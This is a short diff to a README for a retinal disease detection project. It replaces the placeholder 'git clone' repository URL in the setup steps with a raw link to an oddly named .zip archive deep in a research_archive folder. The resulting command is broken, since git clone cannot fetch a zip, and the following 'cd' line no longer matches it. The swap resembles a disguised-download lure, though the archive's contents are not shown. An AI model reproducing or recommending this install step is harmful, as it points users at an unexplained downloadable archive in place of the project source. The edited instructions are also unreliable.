@@ -49,7 +49,7 @@ To run the streamlined system for inference:
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/USERNAME/retinal-disease-detection-cv.git
+   git clone https://raw.githubusercontent.com/shivendra911/retinal-disease-detection-cv/main/research_archive/notebooksv2/disease_cv_detection_retinal_underjanitor.zip
    cd retinal-disease-detection-cv
    ```
 
